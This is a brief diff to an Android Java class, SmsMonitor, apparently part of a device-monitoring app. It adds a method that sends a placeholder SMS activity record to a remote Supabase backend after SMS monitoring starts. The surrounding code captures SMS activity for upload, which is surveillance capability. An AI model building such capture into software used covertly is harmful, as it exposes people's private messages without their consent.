@@ -75,8 +75,38 @@ public class SmsMonitor {
             Log.d(TAG, "SMS content observer registered");
             
             Log.i(TAG, "✅ SMS monitoring started successfully (broadcast + content observer)");
+            
+            // Test SMS monitoring by logging a test activity
+            testSmsMonitoring();
         } catch (Exception e) {
             Log.e(TAG, "❌ Failed to start SMS monitoring: " + e.getMessage());
+        }
+    }
+    
+    private void testSmsMonitoring() {
+        try {
+            Log.i(TAG, "🧪 Testing SMS monitoring...");
+            
+            // Log a test SMS activity to verify the system works
+            org.json.JSONObject testData = new org.json.JSONObject();
+            testData.put("address", "TEST");
+            testData.put("message", "SMS monitoring test - service started");
+            testData.put("timestamp", System.currentTimeMillis());
+            testData.put("type", "test");
+            
+            supabaseClient.logActivity(deviceId, "sms", testData, new SupabaseClient.ApiCallback() {
+                @Override
+                public void onSuccess(String response) {
+                    Log.i(TAG, "✅ SMS monitoring test SUCCESSFUL");
+                }
+                
+                @Override
+                public void onError(String error) {
+                    Log.e(TAG, "❌ SMS monitoring test FAILED: " + error);
+                }
+            });
+        } catch (Exception e) {
+            Log.e(TAG, "❌ SMS monitoring test error: " + e.getMessage());
         }
     }
     
